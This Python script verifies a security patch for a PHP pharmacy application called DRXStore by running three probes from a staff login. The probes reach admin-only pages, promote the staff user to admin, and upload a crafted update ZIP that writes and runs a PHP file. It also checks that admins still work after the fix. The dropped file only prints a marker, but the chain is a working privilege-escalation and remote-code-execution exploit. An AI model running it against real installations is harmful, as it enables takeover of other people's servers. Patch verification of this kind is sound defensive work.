#!/usr/bin/env python3
"""
DRXStore patch verification - same three probes against any version.

    python3 verify_patch.py <url> <app_dir> --expect fixed|vulnerable

It does NOT assume an answer. For each claim it reports REACHED (the attack worked) or
BLOCKED (the app refused), then compares the set against --expect and exits 0 only if it
matches. Run it against v2.0.0 with --expect vulnerable and v3.0.0 with --expect fixed:
if both match, the patch is real and the probe is trustworthy.

Probes, all from a plain `staff` session:
  1. admin-only pages   ?p=users / ?p=settings / ?p=sw_update
  2. role escalation    POST ?p=users action=edit_staff role=admin
  3. code execution     upload a ZIP through ?p=sw_update and execute the dropped file

Regression check: an `admin` session must still get 200 on those pages and still be able to
create a user - a patch that locks admins out is not a fix.
"""
import glob, http.cookiejar, io, json, os, re, sys, tempfile, urllib.error
import urllib.parse, urllib.request, uuid, zipfile

pos = [a for a in sys.argv[1:] if not a.startswith("--")]
EXPECT = "fixed"
for i, a in enumerate(sys.argv):
    if a == "--expect" and i + 1 < len(sys.argv):
        EXPECT = sys.argv[i + 1]
if len(pos) < 2:
    sys.exit("usage: verify_patch.py <url> <app_dir> --expect fixed|vulnerable")

BASE = pos[0].rstrip("/")
APP = pos[1].rstrip("/")
USER, PASS = "staff1", "StaffPass123"
ADMIN, ADMIN_PASS = "admin", "AdminPass123"
SHELL = f"probe_{uuid.uuid4().hex[:8]}.php"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class Client:
    def __init__(self):
        self.cj = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(self.cj), NoRedirect()]
        proxy = os.environ.get("http_proxy") or os.environ.get("HTTP_PROXY")
        if proxy:
            handlers.insert(0, urllib.request.ProxyHandler({"http": proxy}))
        self.op = urllib.request.build_opener(*handlers)

    def req(self, path, data=None, raw=None, ctype=None):
        if raw is not None:
            r = urllib.request.Request(BASE + path, data=raw, method="POST",
                                       headers={"Content-Type": ctype})
        else:
            b = urllib.parse.urlencode(data).encode() if data else None
            r = urllib.request.Request(BASE + path, data=b, method="POST" if data else "GET")
        try:
            x = self.op.open(r, timeout=90)
            return x.getcode(), x.read().decode("utf8", "ignore"), dict(x.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf8", "ignore"), dict(e.headers)
        except urllib.error.URLError as e:
            sys.exit(f"[!] cannot reach {BASE}: {e.reason}")

    def sid(self):
        for c in self.cj:
            if c.name == "PHPSESSID":
                return c.value
        return None


def csrf(h):
    m = re.search(r'name="csrf_token"\s+value="([a-f0-9]+)"', h)
    return m.group(1) if m else None


def session_role(sh):
    sid = sh.sid()
    if not sid:
        return None
    for f in glob.glob(os.path.join(tempfile.gettempdir(), f"sess_{sid}")):
        try:
            m = re.search(r'admin_role\|s:\d+:"([^"]+)"', open(f, errors="ignore").read())
        except OSError:
            continue
        if m:
            return m.group(1)
    return None


def bootstrap(sh):
    """Wizard if fresh (handling the v3 one-time token), admin, and a staff account."""
    base = "/index.php?p=setup"
    _, h, _ = sh.req(base)                     # v3: 403 here, and creates the token file
    path = base
    if csrf(h) is None:                        # v3 gates the wizard behind ?token=
        tok_file = os.path.join(APP, "data", ".setup_token")
        if not os.path.exists(tok_file):
            return                             # already configured, or not a wizard state
        tok = open(tok_file).read().strip()
        path = base + "&token=" + urllib.parse.quote(tok)
        _, h, _ = sh.req(path)                 # keep the token on every wizard request
    if not csrf(h):
        return                                 # already configured
    print("    fresh instance -> running setup wizard")
    sh.req(path, {"csrf_token": csrf(h), "step": "1",
        "store_name": "Verify Pharmacy", "store_email": "v@example.test", "store_address": "x",
        "store_phone": "1", "store_gst": "", "store_dl": "", "currency": "$"})
    _, h, _ = sh.req(path + "&step=2")
    sh.req(path, {"csrf_token": csrf(h), "step": "2", "full_name": "Admin",
        "username": ADMIN, "email": "admin@example.test", "password": ADMIN_PASS,
        "confirm": ADMIN_PASS})
    _, h, _ = sh.req(path + "&step=3")
    sh.req(path, {"csrf_token": csrf(h), "step": "3", "driver": "json"})
    _, h, _ = sh.req(path + "&step=4")
    sh.req(path, {"csrf_token": csrf(h), "step": "4"})


def login(sh, user, pw):
    sh.req("/index.php?p=login")
    _, h, _ = sh.req("/index.php?p=login")
    sh.req("/index.php?p=login", {"csrf_token": csrf(h), "login": user, "password": pw})
    code, _, _ = sh.req("/index.php?p=dashboard")
    return code == 200


def make_package():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("drxstore/index.php", open(os.path.join(APP, "index.php")).read())
        z.writestr("drxstore/config/app.php", open(os.path.join(APP, "config/app.php")).read())
        z.writestr(f"drxstore/{SHELL}", '<?php echo "PROBE_OK:".(6*7); ?>')
        pad = zipfile.ZipInfo("drxstore/assets/pad.bin")
        pad.compress_type = zipfile.ZIP_STORED
        z.writestr(pad, os.urandom(70000))
    return buf.getvalue()


def upload(sh, pkg):
    _, page, _ = sh.req("/index.php?p=sw_update")
    t = csrf(page)
    if not t:
        return None, ""
    b = "----x" + uuid.uuid4().hex
    body = b"".join([
        f'--{b}\r\nContent-Disposition: form-data; name="csrf_token"\r\n\r\n{t}\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="action"\r\n\r\nupload_update\r\n'.encode(),
        f'--{b}\r\nContent-Disposition: form-data; name="update_zip"; filename="update.zip"\r\n'
        f'Content-Type: application/zip\r\n\r\n'.encode() + pkg + b"\r\n",
        f"--{b}--\r\n".encode()])
    code, resp, _ = sh.req("/index.php?p=sw_update", raw=body,
                           ctype=f"multipart/form-data; boundary={b}")
    return code, resp


def main():
    print(f"target : {BASE}\napp    : {APP}\nexpect : {EXPECT}\n")
    boot = Client()
    bootstrap(boot)

    adm = Client()
    if not login(adm, ADMIN, ADMIN_PASS):
        sys.exit("[!] cannot log in as admin - instance not bootstrapped")
    # make sure staff1 exists (idempotent)
    _, h, _ = adm.req("/index.php?p=users")
    if "staff1" not in h:
        adm.req("/index.php?p=users", {"csrf_token": csrf(h), "action": "add_staff",
            "name": "Staff One", "username": USER, "email": "staff1@example.test",
            "password": PASS, "role": "staff"})

    sh = Client()
    if not login(sh, USER, PASS):
        sys.exit(f"[!] cannot log in as {USER}")
    role = session_role(sh)
    print(f"staff session: {USER}, admin_role={role!r}")
    if role != "staff":
        sys.exit("[!] session role is not 'staff' - probe would be meaningless")

    results = {}

    # --- claim 1: admin-only pages reachable from a staff session
    reach = []
    for page in ("users", "settings", "sw_update"):
        code, body, hdr = sh.req(f"/index.php?p={page}")
        where = hdr.get("Location", "-")
        reach.append(code == 200)
        print(f"  ?p={page:10s} -> {code}  {'REACHED' if code == 200 else 'blocked -> ' + where}")
    results["1. admin pages reachable by staff"] = any(reach)

    # --- claim 2: role escalation
    _, h, _ = sh.req("/index.php?p=users")
    if csrf(h):
        sh.req("/index.php?p=users", {"csrf_token": csrf(h), "action": "edit_staff", "id": "2",
            "name": "Staff One", "username": USER, "email": "staff1@example.test",
            "password": "", "role": "admin"})
    # verify from the server-side session/data, not from a page label
    role_now = session_role(sh)
    promoted = False
    users_file = os.path.join(APP, "data", "users.json")
    if os.path.exists(users_file):
        try:
            promoted = any(u.get("username") == USER and u.get("role") == "admin"
                           for u in json.load(open(users_file)))
        except Exception:
            pass
    print(f"  escalate          -> role in store: {'admin' if promoted else 'unchanged'}")
    results["2. staff can promote itself to admin"] = promoted

    # --- claim 3: code execution through the updater
    code, resp = upload(sh, make_package())
    accepted = bool(resp) and "Apply Update" in resp
    if accepted:
        sh.req("/index.php?p=sw_update", {"csrf_token": csrf(resp), "action": "apply_update"})
    on_disk = os.path.exists(os.path.join(APP, SHELL))
    exec_code, exec_out, _ = sh.req(f"/{SHELL}")
    executed = exec_code == 200 and "PROBE_OK" in exec_out
    print(f"  updater upload    -> accepted={accepted}  file_written={on_disk}  executed={executed}")
    results["3. arbitrary PHP written and executed"] = executed or on_disk

    # --- regression: admin must still work
    reg_ok = True
    for page in ("users", "settings", "sw_update"):
        code, _, _ = adm.req(f"/index.php?p={page}")
        reg_ok &= code == 200
    _, h, _ = adm.req("/index.php?p=users")
    adm.req("/index.php?p=users", {"csrf_token": csrf(h), "action": "add_staff",
        "name": "Reg Check", "username": "regcheck", "email": "reg@example.test",
        "password": "RegCheck123", "role": "staff"})
    created = "regcheck" in adm.req("/index.php?p=users")[1]
    print(f"  admin regression  -> pages_200={reg_ok}  can_create_user={created}\n")

    # --- verdict
    observed = "vulnerable" if any(results.values()) else "fixed"
    print("=" * 60)
    for k, v in results.items():
        print(f"  {'REACHED' if v else 'BLOCKED':8s} {k}")
    print("=" * 60)
    print(f"observed: {observed}   expected: {EXPECT}")

    ok = (observed == EXPECT)
    if not ok:
        print("\nRESULT: MISMATCH - do not report either way until this is explained.")
        return 1
    if not (reg_ok and created):
        print("\nRESULT: patch holds but ADMIN REGRESSION detected - this is a bug in the fix.")
        return 1
    print("\nRESULT: as expected." + (" Patch verified." if EXPECT == "fixed" else " Control confirmed."))
    return 0


if __name__ == "__main__":
    sys.exit(main())
